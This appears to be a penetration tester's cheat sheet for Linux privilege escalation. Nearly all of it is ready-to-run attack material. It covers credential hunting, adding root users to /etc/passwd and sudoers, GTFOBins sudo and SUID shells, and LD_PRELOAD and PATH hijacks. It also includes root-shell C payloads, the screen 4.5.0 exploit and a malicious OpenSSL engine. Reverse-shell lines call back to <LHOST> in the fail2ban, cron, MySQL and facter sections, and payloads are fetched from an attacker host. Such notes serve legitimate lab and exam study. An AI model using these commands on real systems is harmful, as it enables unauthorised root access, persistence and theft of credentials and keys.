---
title: Linux Privilege Escalation
type: note
tab: Privesc
inputs: [Shell]
outputs: [Root, SUID, SudoRights, Capabilities, Credentials]
tags: [Linux, PrivilegeEscalation]
---

# Linux Privilege Escalation

## Recon & Credentials

### Quick Checks

#Shell #Linux #PrivilegeEscalation
Run a first-pass Linux privesc checklist for system context, sudo, SUID/SGID, capabilities, writable paths, cron, processes, and kernel version.

```sh
# Current user, groups, hostname, and kernel.
id
whoami
hostname
uname -a
uname -r
cat /etc/os-release
lsb_release -a
lscpu

# Local users with interactive shells.
cat /etc/passwd
getent passwd | grep -v nologin | grep -v false

# Home and common web roots.
ls -la /home
ls -la /var/www
ls -la /var/www/html

# Network and interesting root-owned processes.
ss -tulpn
netstat -tulpn
ps aux | grep root
ps aux | grep root | grep -i mysql

# Sudo rights.
sudo -l
sudo --version

# SUID binaries.
find / -perm -4000 -type f 2>/dev/null
# SUID binaries with permission, owner, and group details.
find / -perm -u=s -type f 2>/dev/null -exec ls -l {} +
# SGID binaries
find / -perm -2000 -type f 2>/dev/null
# SGID binaries with permission, owner, and group details.
find / -perm -g=s -type f 2>/dev/null -exec ls -l {} +
find / -perm -g=s -type f 2>/dev/null -exec ls -l {} + | grep -v "root root"
# SUID and SGID binaries.
find / -perm /6000 -type f 2>/dev/null -exec ls -l {} +

# Linux capabilities and writable locations.
getcap -r / 2>/dev/null
getcap -r / 2>/dev/null | grep -E "cap_setuid|cap_setgid|cap_sys_admin"
find / -writable -type d 2>/dev/null
find / -perm -o+w -type d 2>/dev/null
find / -writable -type f 2>/dev/null | grep -Ev "/proc|/sys|/dev"
find / -perm -o+w -type f 2>/dev/null | grep -Ev "/proc|/sys|/dev"
# Writable SUID/SGID files are high-signal privesc candidates.
find / -perm /6000 -type f -writable 2>/dev/null -exec ls -l {} +

# Cron and kernel quick checks.
cat /etc/crontab
ls -la /etc/cron*
searchsploit linux kernel <VERSION>
```

### Automated Audit Scripts

#Shell #Linux #PrivilegeEscalation
Download and run LinPEAS or pspy for fast automated Linux privilege escalation triage.


```sh
wget "http://<LHOST>/linpeas.sh" -O linpeas.sh
curl "http://<LHOST>/linpeas.sh" -o linpeas.sh
chmod +x linpeas.sh
# Run normal check
./linpeas.sh
# Run a full check (slower/noisier)
./linpeas.sh -a

# Run a faster check
./linpeas.sh -s

# Save output and grep for high-signal findings.
./linpeas.sh | tee linpeas.out
# with no color
./linpeas.sh -N | tee linpeas.out

grep -i "red\|suid\|sudo\|write" linpeas.out

# Grep high-signal findings
grep -Ei "red|yellow|suid|sgid|sudo|capab|cap_setuid|writable|write|cron|path|passwd|shadow|docker|lxd|nfs|ssh|backup|password|credential|token" linpeas.out

# pspy: monitor root processes and cron activity without root.
wget http://<LHOST>/pspy64 -O pspy64
chmod +x pspy64
./pspy64
./pspy64 -p -i 1000
```

### Credential Hunting

#Shell #Linux #Looting
Search for credentials in config files, shell history, packet captures, and SSH key material.

```sh
# Common web/app config files.
find / -name ".env" -o -name "wp-config.php" -o -name "config.php" 2>/dev/null
find / -type f -exec grep -i -I "PASSWORD=" {} /dev/null \; 2>/dev/null
locate pass | more
grep -r 'password' /var/www/ 2>/dev/null
grep -r 'passwd' /etc/ 2>/dev/null
find / -name '*.conf' -exec grep -i 'password' {} \; 2>/dev/null

# Bash history.
history
cat /home/<USER>/.bash_history
cat ~/.bash_history | grep -i passw
cat ~/.zsh_history
cat ~/.mysql_history

# Credentials inside tcpdump/pcap captures.
tcpdump -nt -r capture.pcap -A 2>/dev/null | grep -P 'pwd='

# SSH keys.
find / -name authorized_keys 2>/dev/null
find / -name id_rsa 2>/dev/null
find / -name '*.pem' 2>/dev/null

# Database/web config files.
cat /var/www/html/config.php
cat /var/www/html/wp-config.php
cat /var/www/html/.env
```

### adm Group Log Looting

#Shell #Linux #Looting
If your user is in the `adm` group, read administrative logs for passwords, credentials, web requests, and command traces.

```sh
# Confirm adm group membership.
id

# Common logs readable by adm users.
ls -la /var/log
ls -la /var/log/syslog /var/log/auth.log /var/log/kern.log 2>/dev/null
ls -la /var/log/apache2 2>/dev/null

# Search for high-signal secrets.
grep -RiaE "pass|password|passwd|pwd|user|token|key|secret|credential" /var/log 2>/dev/null
```

### SSH Private Key Reuse

#Shell #PrivateKey #Linux #Looting
Use a discovered SSH private key, then crack it if it is passphrase-protected.

```sh
# Attacker: save the discovered key locally, then lock down permissions.
chmod 600 id_rsa

# Attacker: try key-based login.
ssh -i id_rsa <USER>@<TARGET_IP>

# Attacker: if the key asks for a passphrase, convert and crack it.
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

## Writable Files

### Writable Password Files

### Writable Password Files - Direct Root Entries

#Shell #Linux #PrivilegeEscalation
Abuse writable `/etc/passwd`, `/etc/shadow`, or `/etc/sudoers` to become root.

```sh
# /etc/passwd option 1: append a UID 0 user with no password.
ls -la /etc/passwd
echo 'root2::0:0:root:/root:/bin/bash' >> /etc/passwd
su - root2
id && whoami

# /etc/passwd option 2: replace root with a blank-password root entry.
echo 'root::0:0:root:/root:/bin/bash' > /etc/passwd
su root
id && whoami

# /etc/shadow: generate a new root hash, then replace root's hash manually.
python -c "import crypt; print(crypt.crypt('NewRootPassword'))"
vi /etc/shadow
su root
id && whoami

# /etc/sudoers: grant your current user full sudo rights.
echo "<USER> ALL=(ALL:ALL) ALL" >> /etc/sudoers
sudo su
id && whoami
```

### Writable Password Files - Known Hash User

#Shell #Linux #PrivilegeEscalation
Append a UID 0 user with a known password hash to a writable passwd file.

1. Copy `/etc/passwd` to a writable path and generate a hash.

```sh
cp /etc/passwd /home/<USER>/passwd
openssl passwd -1 -salt root2 'Password123@'
```

2. Append the UID 0 user to the copied passwd file.

```sh
echo 'root2:$1$root2$tnwA9iGUqQESoO3fi07YQ/:0:0:root:/root:/bin/bash' >> /home/<USER>/passwd
```

3. Replace `/etc/passwd`, then switch to the new root user.

```sh
cp /home/<USER>/passwd /etc/passwd
su root2
id && whoami
```

## Sudo Abuse

### Sudo / GTFOBins

#Shell #Linux #PrivilegeEscalation
Triage `sudo -l`, then check GTFOBins or known sudo CVEs for the allowed binary/version.

```sh
# Check what can run through sudo.
sudo -l
sudo --version

# Search the allowed binary or sudo CVE path manually.
# Useful references:
# - https://gtfobins.github.io/
# - https://github.com/RoqueNight/Linux-Privilege-Escalation-Basics

# If a sudo-allowed GTFOBins entry lets you chmod arbitrary paths.
chmod +s /bin/bash
/bin/bash -p

# If fail2ban-client runs with elevated rights.
fail2ban-client set <JAIL> action <ACTION> actionban "bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"
```

### Sudo Root Shell Shortcuts

#Shell #Linux #PrivilegeEscalation
Try direct root shell shortcuts when sudo or SUID bash is already available.

```sh
# SUID bash.
bash -p

# Sudo shell.
sudo -i
sudo su
```

### Sudo GTFOBins Shortcuts

#Shell #Linux #PrivilegeEscalation
Use common sudo-allowed binaries to spawn a shell.

```sh
# If vim is sudo-allowed.
sudo /usr/bin/vim -c ':!/bin/bash'

# If nano is sudo-allowed, open the file, press Ctrl+r then Ctrl+x, and run this command.
sudo /bin/nano /home/<USER>/test.txt
reset; sh 1>&0 2>&0

# If Python is sudo-allowed.
sudo -u root python -c 'import pty;pty.spawn("/bin/bash")'

# If awk is sudo-allowed.
sudo awk 'BEGIN {system("/bin/sh")}'

# If find is sudo-allowed.
sudo find /etc/passwd -exec /bin/sh \;
sudo find . -exec /bin/sh \; -quit
sudo find /bin -name nano -exec /bin/sh \;

# If rsync is sudo-allowed.
sudo /usr/bin/rsync -e '/bin/sh -c "/bin/sh 0<&2 1>&2"' x:x

# If zip is sudo-allowed.
sudo /usr/bin/zip /tmp/zip /etc/hosts -T -TT '/bin/sh #'
id && whoami
```

### Sudo Perl Script Hijack

#Shell #Linux #PrivilegeEscalation
If sudo allows a Perl script and that script executes a writable helper path, replace the helper with a root shell payload.

1. Confirm the sudo rule and inspect the script.

```sh
sudo -l
cat <SCRIPT_PATH>
```

2. Replace the writable helper called by the script.

```sh
echo '/bin/bash -p' > <WRITABLE_HELPER_PATH>
chmod +x <WRITABLE_HELPER_PATH>
```

3. Execute the allowed Perl script through sudo.

```sh
sudo /usr/bin/perl <SCRIPT_PATH>
id && whoami
```

### Sudo /bin/nice Path Traversal

#Shell #Linux #PrivilegeEscalation
Abuse an overly broad sudo rule such as `/bin/nice /notes/*` by traversing to a writable script.

1. Confirm the sudo rule.

```sh
sudo -l
```

2. Create `root.sh` with this body.

```file-sh
/bin/bash
```

3. Make the script executable and execute it through the allowed sudo path.

```sh
chmod 777 root.sh
sudo /bin/nice /notes/../home/<USER>/root.sh
id && whoami
```

### Sudo LD_PRELOAD

#Shell #Linux #PrivilegeEscalation
Exploit `env_keep+=LD_PRELOAD` when a sudo-allowed binary preserves `LD_PRELOAD`.

1. Confirm the sudoers environment keeps `LD_PRELOAD`.

```sh
sudo -l
```

2. Create `priv.c` with the preload body.

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/bash");
}
```

3. Compile the preload library on the target after saving the body as `/tmp/priv.c`.

```sh
cd /tmp
gcc -fPIC -shared -o priv.so priv.c -nostartfiles
```

4. Replace `awk` with any sudo-allowed binary from `sudo -l`.

```sh
sudo LD_PRELOAD=/tmp/priv.so awk
id && whoami
```

## SUID / SGID Abuse

### SUID / SGID Discovery

#Shell #Linux #PrivilegeEscalation
Find SUID/SGID binaries, then inspect whether they are exploitable through GTFOBins, relative command execution, or file overwrite.

```sh
# SUID binaries run with the file owner's privileges, often root.
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null | xargs ls -l
find / -uid 0 -perm -4000 -type f 2>/dev/null

# SGID binaries run with the file group's privileges.
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null | xargs ls -l

# Both SUID and SGID.
find / -perm /6000 -type f 2>/dev/null

# Inspect interesting binaries.
file <BIN>
strings <BIN>

# Check GTFOBins for direct abuse paths.
# https://gtfobins.github.io/
```

### Writable SUID Binary Replacement

#Shell #Linux #PrivilegeEscalation
If a SUID/SGID binary itself is writable, try replacing it with a root-shell payload. Confirm the SUID bit remains after writing; many Linux systems clear SUID/SGID bits when an unprivileged user modifies a file.

1. Find writable SUID/SGID binaries and inspect the candidate.

```sh
find / -perm /6000 -type f -writable 2>/dev/null -exec ls -l {} +
ls -la <SUID_BIN>
file <SUID_BIN>
```

2. Create `suid-shell.c` with a root shell payload.

```c
#include <stdlib.h>
#include <unistd.h>

int main(void) {
  setuid(0);
  setgid(0);
  system("/bin/bash -p");
  return 0;
}
```

3. Compile, back up the original binary, replace it, and run it.

```sh
gcc suid-shell.c -o suid-shell
cp <SUID_BIN> /tmp/suid.bak
cp suid-shell <SUID_BIN>
ls -la <SUID_BIN>
<SUID_BIN>
id && whoami
```

4. If the SUID bit disappears, restore the binary if safe and pivot to PATH hijack, GTFOBins, cron, or writable script checks.

```sh
cp /tmp/suid.bak <SUID_BIN>
ls -la <SUID_BIN>
```

### SUID PATH Hijack

#Shell #Linux #PrivilegeEscalation
Hijack a SUID binary that calls another command without using a full absolute path.

1. Find and inspect a SUID binary.

```sh
find / -perm -u=s -type f 2>/dev/null | xargs ls -l
ls -la /path/to/suid_binary
strings /path/to/suid_binary
strace -e trace=execve /path/to/suid_binary 2>&1 | grep exec
```

2. Example 1 - compiled replacement command: if `strings` shows a relative command such as `ssh root@backup`, save this as `/tmp/ssh.c`.

```file-c
#include <stdlib.h>
#include <unistd.h>

int main(void) {
  setuid(0);
  setgid(0);
  system("/bin/bash -p");
  return 0;
}
```

3. Compile the replacement, prepend it to `PATH`, then run the vulnerable SUID binary.

```sh
# Example: vulnerable binary calls `ssh` without `/usr/bin/ssh`.
gcc /tmp/ssh.c -o /tmp/ssh
chmod +x /tmp/ssh
echo $PATH
export PATH=/tmp:$PATH
/path/to/suid_binary
id && whoami
```

4. Example 2 - shell-script replacement command: if the binary calls `service` without `/usr/sbin/service`, place a fake `service` first in `PATH`.

```sh
cd /tmp
echo "/bin/bash -p" > service
chmod +x service
export PATH=/tmp:$PATH
/usr/bin/status
id && whoami
```

5. Example 3 - if a SUID menu binary calls `uname` without an absolute path, place a fake `uname` first in `PATH`.

```sh
find / -perm -u=s -type f 2>/dev/null
strings /usr/bin/menu
cd /tmp
echo '/bin/sh' > uname
chmod +x uname
export PATH=/tmp:$PATH
/usr/bin/menu
id && whoami
```

### SUID GTFOBins Examples

#Shell #Linux #PrivilegeEscalation
Use common SUID abuse patterns for `systemctl`, `cp`, or `yum` when those binaries are exploitable in the target context.

1. `systemctl`: create a transient service file with this body.

```ini
[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target
```

2. Link and start the service, then use SUID bash.

```sh
TF=$(mktemp).service
vi "$TF"
systemctl link "$TF"
systemctl enable --now "$TF"
/bin/bash -p
id && whoami
```

3. `cp`: generate a password hash and append a UID 0 user locally on the attacker box.

```sh
openssl passwd -1 -salt ignite NewRootPassword
echo "root2:<HASH>:0:0:root:/root:/bin/bash" >> passwd
python -m http.server 9000
```

4. Download and copy the prepared passwd file on the target.

```sh
wget -O /tmp/passwd http://<LHOST>:9000/passwd
cp /tmp/passwd /etc/passwd
su root2
id && whoami
```

5. `yum`: abuse a SUID `yum` plugin path to execute a root shell.

```sh
TF=$(mktemp -d)
cat > "$TF/x" <<'EOF'
[main]
plugins=1
pluginpath=<PLUGIN_DIR>
pluginconfpath=<PLUGIN_DIR>
EOF
sed -i "s|<PLUGIN_DIR>|$TF|g" "$TF/x"

cat > "$TF/y.conf" <<'EOF'
[main]
enabled=1
EOF

cat > "$TF/y.py" <<'EOF'
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh', '/bin/sh')
EOF

yum -c "$TF/x" --enableplugin=y
id && whoami
```

### SUID Screen 4.5.0

#Shell #Linux #PrivilegeEscalation
Exploit vulnerable SUID `screen` 4.5.0 by writing to `/etc/ld.so.preload` and dropping a SUID rootshell.

1. Confirm SUID screen and trigger a failed log file write.

```sh
find / -perm -u=s -type f 2>/dev/null
screen -v
screen -D -m -L file_doesNOT_exist
```

2. Create and compile `rootshell.c`.

```file-c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(void) {
  setuid(0);
  setgid(0);
  seteuid(0);
  setegid(0);
  char *args[] = {"/bin/sh", NULL};
  execvp("/bin/sh", args);
  return 0;
}
```

```sh
gcc rootshell.c -o rootshell -static
python3 -m http.server 80
```

3. Transfer the rootshell to the target.

```sh
cd /tmp
wget http://<LHOST>/rootshell
chmod +x rootshell
```

4. Create and compile `libhax.c`.

```file-c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>

__attribute__ ((__constructor__))
void dropshell(void) {
  chown("/tmp/rootshell", 0, 0);
  chmod("/tmp/rootshell", 04755);
  unlink("/etc/ld.so.preload");
}
```

```sh
gcc -fPIC -shared -ldl -o libhax.so libhax.c
# If target is 32-bit:
gcc -m32 -fPIC -shared -ldl -o libhax.so libhax.c
```

5. Transfer the library, overwrite `ld.so.preload`, and trigger the rootshell.

```sh
wget http://<LHOST>/libhax.so -O /tmp/libhax.so
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
screen -ls
screen -X quit
cd /tmp
./rootshell
id && whoami
```

### TOCTOU Symlink Race

#Shell #Linux #PrivilegeEscalation
Race a SUID file-reader that checks one path but opens the file after a symlink swap.

```sh
# 1. Inspect the SUID reader and confirm it can read allowed files.
ls -la
./readfile /etc/passwd

# 2. Confirm the protected file is denied directly.
./readfile /etc/shadow

# 3. Create a symlink to an allowed file and test it.
ln -s /etc/passwd link
./readfile link

# 4. In one session, continuously swap the symlink target.
while true; do ln -sfT /etc/shadow link; ln -sfT /etc/passwd link; done &

# 5. In another session, repeatedly trigger the reader until /etc/shadow leaks.
while true; do ./readfile link; done
```

## Linux Capabilities

### Capability Discovery

#Shell #Linux #PrivilegeEscalation
Find dangerous Linux capabilities and abuse high-impact ones such as `cap_setuid` or `cap_dac_read_search`.

```sh
# Discover file capabilities.
getcap -r / 2>/dev/null

# Inspect process capabilities if a PID is interesting.
cat /proc/<PID>/status | grep Cap

# High-value examples:
# cap_setuid            -> can switch UID, often direct root shell on interpreters.
# cap_dac_override      -> can bypass file permissions.
# cap_dac_read_search   -> can read files regardless of DAC permissions.
# cap_sys_admin         -> broad privileged capability, investigate carefully.
# cap_net_raw           -> raw socket access; usually not direct privesc.
# cap_net_bind_service  -> can bind low ports, usually not direct privesc by itself.

# Python with cap_setuid.
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id && whoami

# Perl with cap_setuid.
/usr/bin/perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
id && whoami

# Tar with cap_dac_read_search: read root-only files.
/usr/bin/tar -cvf shadow.tar /etc/shadow
/usr/bin/tar -xvf shadow.tar
cat etc/shadow
```

### Capability File Looting

#Shell #Linux #PrivilegeEscalation
Use `cap_dac_read_search` on archive tools to steal root-only credentials or keys.

```sh
# Victim: archive and extract /etc/shadow.
getcap -r / 2>/dev/null
/usr/bin/tar -cvf shadow.tar /etc/shadow
/usr/bin/tar -xvf shadow.tar
cat etc/shadow

# Attacker: crack copied hashes offline.
john shadow --wordlist=/usr/share/wordlists/rockyou.txt

# Victim: if root SSH key is readable through tar capability.
/usr/bin/tar -cvf key.tar /root/.ssh/id_rsa
/usr/bin/tar -xvf key.tar
cat root/.ssh/id_rsa

# Attacker: use the copied key.
chmod 600 id_rsa
ssh -i id_rsa root@<TARGET_IP>
id && whoami
```

### OpenSSL Capability Engine

#Shell #Linux #PrivilegeEscalation
Abuse OpenSSL with `cap_setuid` by loading a custom engine that marks `/bin/bash` as SUID.

1. Confirm OpenSSL has `cap_setuid`.

```sh
getcap -r / 2>/dev/null
```

2. Create `priv.c` with this OpenSSL engine body on the attacker box.

```c
#include <openssl/engine.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

static const char *engine_id = "priv";
static const char *engine_name = "priv";

static int bind(ENGINE *e, const char *id) {
  int ret = 0;
  if (!ENGINE_set_id(e, engine_id)) goto end;
  if (!ENGINE_set_name(e, engine_name)) goto end;
  setuid(0);
  setgid(0);
  system("chmod +s /bin/bash");
  ret = 1;
end:
  return ret;
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```

3. Compile and serve the shared object from the attacker box.

```sh
gcc -fPIC -c priv.c -o priv.o
gcc -shared -o priv.so priv.o -lcrypto
python -m http.server 9000
```

4. Load the engine on the victim and use the SUID bash.

```sh
wget -O /tmp/priv.so http://<LHOST>:9000/priv.so
openssl req -engine /tmp/priv.so
/bin/bash -p
id && whoami
```

## Cron / Scheduled Jobs

### Cron Discovery & Writable Scripts

#Shell #Linux #PrivilegeEscalation
Abuse a root cron job when the called script, working directory, or wildcard path is writable.

```sh
# Target: list cron jobs and scheduled scripts.
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/* 2>/dev/null
crontab -l

# Target: inspect script permissions from cron entries.
ls -la /opt/script.sh
stat /opt/script.sh

# Target: if a root-run script is writable, append a payload.
echo 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' >> /opt/script.sh

# Attacker: catch the callback.
nc -lvnp <LPORT>

# Target: monitor root-run jobs if pspy is available.
./pspy64
```

### Writable Root Cron Cleanup Script

#Shell #Linux #PrivilegeEscalation
If a root-owned scheduled script is writable, append a sudoers grant and wait for cron to run it.

```sh
# 1. Find root-owned files that are writable.
find / -user root -perm -0777 -type f 2>/dev/null

# 2. Inspect the candidate script.
cat clean_temp.sh

# 3. Append a sudoers rule to the writable script.
echo "<USER> ALL=(ALL:ALL) ALL" >> clean_temp.sh

# 4. Wait for the scheduled job, then become root.
sudo -l
sudo -s
id && whoami
```

### Cron File Overwrite

#Shell #Linux #PrivilegeEscalation
Create or overwrite the file that a root cron job runs, then wait for the scheduled execution.

1. Relative or missing file: create the file where cron resolves it.

```sh
cat /etc/crontab
# Example output: * * * * * root systemupdate.sh
echo 'chmod +s /bin/bash' > /home/<USER>/systemupdate.sh
chmod +x /home/<USER>/systemupdate.sh
```

2. Writable shell script: append a payload to the root-run script.

```sh
cat /etc/crontab
# Example output: * * * * * root /usr/bin/local/network-test.sh
echo 'chmod +s /bin/bash' >> /usr/bin/local/network-test.sh
```

3. Writable Python script: replace the script body with this payload.

```python
import os
os.system("chmod +s /bin/bash")
```

4. Save the Python payload on the target.

```sh
cat /etc/crontab
# Example output: * * * * * root /var/www/html/web-backup.py
vi /var/www/html/web-backup.py
```

5. Wait for cron, then use the SUID bash.

```sh
/bin/bash -p
id && whoami
```

### Tar Checkpoint Cron Abuse

#Shell #Linux #PrivilegeEscalation
Abuse wildcard tar checkpoint options in a writable cron backup directory.

1. Confirm the cron job and move to the writable backup directory used by root.

```sh
cat /etc/crontab
# Example: */2 * * * * root cd /home/<USER>/backup && tar -zcf /tmp/backup.tar.gz *
cd <WRITABLE_BACKUP_DIR>
```

2. Create `shell.sh` with a payload body. Use the sudoers grant only when a reverse shell is not practical.

```file-sh
#!/bin/sh
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash

# Alternative: grant sudo to the current user.
# echo "<USER> ALL=(ALL:ALL) ALL" >> /etc/sudoers
```

3. Save the payload file and make it executable.

```sh
vi shell.sh
chmod +x shell.sh
```

4. Create tar option files consumed by wildcard expansion.

```sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```

5. Wait for cron, then use the SUID bash copy.

```sh
/tmp/rootbash -p
id && whoami

# If you used the sudoers alternative:
sudo -l
sudo -s
```

### Sudo / SUID Facter

#Shell #Linux #PrivilegeEscalation
Exploit sudo/SUID `facter` with a local shell payload or a reverse shell custom fact.

1. Local shell payload: create `/tmp/facts/shell.rb` with this body.

```ruby
exec "/bin/sh"
```

2. Run `facter` with the custom local shell fact.

```sh
mkdir -p /tmp/facts
vi /tmp/facts/shell.rb
sudo /usr/bin/facter --custom-dir=/tmp/facts x
```

3. Reverse shell payload: create `/tmp/facts/rev.rb` with this body.

```ruby
require "socket"
exit if fork
c = TCPSocket.new("<LHOST>", <LPORT>)
while (cmd = c.gets)
  IO.popen(cmd, "r") { |io| c.print io.read }
end
```

4. Catch the callback, then run `facter` with the reverse shell fact.

```sh
nc -lvnp <LPORT>
mkdir -p /tmp/facts
vi /tmp/facts/rev.rb
sudo /usr/bin/facter --custom-dir=/tmp/facts x
```

### Chkrootkit 0.49

#Shell #Linux #PrivilegeEscalation
Exploit vulnerable `chkrootkit` 0.49 when it runs as root, commonly through cron.

```sh
# Target: confirm scheduled execution and vulnerable version.
cat /etc/cron.daily
which chkrootkit
ls -la /usr/bin/chkrootkit
chkrootkit -V

# Target: create the vulnerable /tmp/update payload used by CVE-2014-0476.
echo '#!/bin/bash' > /tmp/update
echo 'chmod +s /bin/bash' >> /tmp/update
chmod +x /tmp/update

# Target: wait for root execution, then use the SUID bash.
/bin/bash -p
id && whoami
```

## Application / Service Abuse

### MySQL Running As Root

#Shell #Linux #PrivilegeEscalation
If MySQL runs as root and you have MySQL admin access, use the MySQL client to execute OS commands.

```sh
# Target: confirm MySQL is running as root.
ps aux | grep root | grep -i mysql

# Target: connect to MySQL.
mysql -u root -p

# Option 1: set SUID on bash from inside mysql.
\! chmod +s /bin/bash
exit
ls -la /bin/bash
/bin/bash -p
id && whoami

# Option 2: trigger a reverse shell from inside mysql.
\! bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1

# Attacker: catch the callback.
nc -lvnp <LPORT>
id && whoami
```

### Docker Group Escape

#Shell #Linux #PrivilegeEscalation
Escape to a host root shell when your user can run Docker or access the Docker socket.

```sh
# Confirm Docker group or usable Docker access.
whoami && id
id | grep docker
cat /etc/passwd | grep docker
docker images

# Container detection.
cat /proc/1/cgroup | grep docker
ls /.dockerenv

# Docker socket access.
ls -la /var/run/docker.sock

# Mount host root into a container and chroot into it.
docker run -v /:/mnt --rm -it <IMAGE> chroot /mnt sh
id && whoami
```

### 7-Zip Wildcard File Read

#Shell #Linux #PrivilegeEscalation
Abuse `7z` wildcard/listfile behavior when root runs `7za ... -- *` inside a directory you control.

```sh
# Target: move to the directory controlled by your low-privileged user.
cd <WRITABLE_DIR>

# Read /etc/shadow through a 7-Zip listfile symlink.
touch @root.txt
ln -s /etc/shadow root.txt

# Alternative: read root SSH key if the backup job runs as root.
touch @root.txt
ln -s /root/.ssh/id_rsa root.txt

# Wait for a root job like:
# 7za a /backup/$(date +%F).7z -t7z -snl -- *
# 7-Zip attempts to read root.txt as a listfile and may print contents to stderr/logs.
```

## Kernel / Last Resort

### Kernel Exploits

#Shell #Linux #PrivilegeEscalation
Treat kernel exploits as a last resort: identify the kernel, research PoCs, read the exploit notes, and test carefully.

```sh
# Target: identify kernel and distro details.
uname -a
uname -r
cat /etc/os-release
cat /proc/version

# Attacker: search for candidate exploits.
searchsploit linux kernel <VERSION>

# Manual research examples:
# Google: <VERSION> exploit
# Google: <VERSION> PoC GitHub
# Dirty COW: https://dirtycow.ninja/
# Linux kernel exploit collection: https://github.com/SecWiki/linux-kernel-exploits
# DirtyPipe: Linux 5.8 < 5.16.11
# PwnKit: Polkit pkexec CVE-2021-4034
# sudo Baron Samedit: sudo < 1.9.5p2 CVE-2021-3156
```

### Kernel CVE-2017-1000112

#Shell #Linux #PrivilegeEscalation
Compile and run Exploit-DB 43418 only after confirming the target kernel is vulnerable and the exploit matches the box.

```sh
# Attacker: copy the exploit locally and serve it.
searchsploit -m linux/local/43418.c
python3 -m http.server 80

# Target: download, compile, and run.
wget http://<LHOST>/43418.c -O 43418.c
gcc 43418.c -o cve-2017-1000112
chmod +x cve-2017-1000112
./cve-2017-1000112
id && whoami
```

### Memory Trick

`SUDO -> SUID -> WRITE -> CRON -> CREDS -> PATH -> KERNEL`
